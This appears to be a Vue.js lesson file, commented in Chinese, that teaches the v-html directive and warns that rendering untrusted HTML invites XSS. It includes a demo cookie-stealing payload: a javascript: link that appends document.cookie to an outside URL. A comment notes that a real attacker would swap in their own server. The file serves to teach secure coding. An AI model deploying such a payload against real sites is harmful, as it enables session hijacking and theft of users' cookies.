<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>02-v-html指令.html</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <!--
            v-html指令：
                1.作用：向指定节点中渲染包含html结构的内容。


                2.与插值语法的区别：
                    (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                    (2).v-html可以识别html结构。


                3.严重注意：v-html有安全性问题！！！！
                    (1). 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                    (2). 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
        -->

        <!-- 會解析 html 標籤  -->
        <div v-text="name"></div>

        <div v-html="str"></div>

        <div v-html="str2"></div>
    </div>


    <script type="text/javascript">
        Vue.config.productionTip = false;


        new Vue({
            el: "#root",
            data: {
                name: '上海',
                //注意 v-html 会解析标签，这点与v-text不一样
                str: '<h1>hello, shanghai</h1>',


                // 1. 危险行为 永远不要相信用户的输入
                // 2. 真的要幹壞事請把地址改成做壞事的服務器
                // 3. document.cookie  ->  獲取你當前網站的所有 cookie
                // 4. 當我們點擊連結的時候，就把 cookie 傳到壞蛋的服務器中
                str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>找到资源了兄弟</a>'
            }
        })
    </script>
</body>

</html>
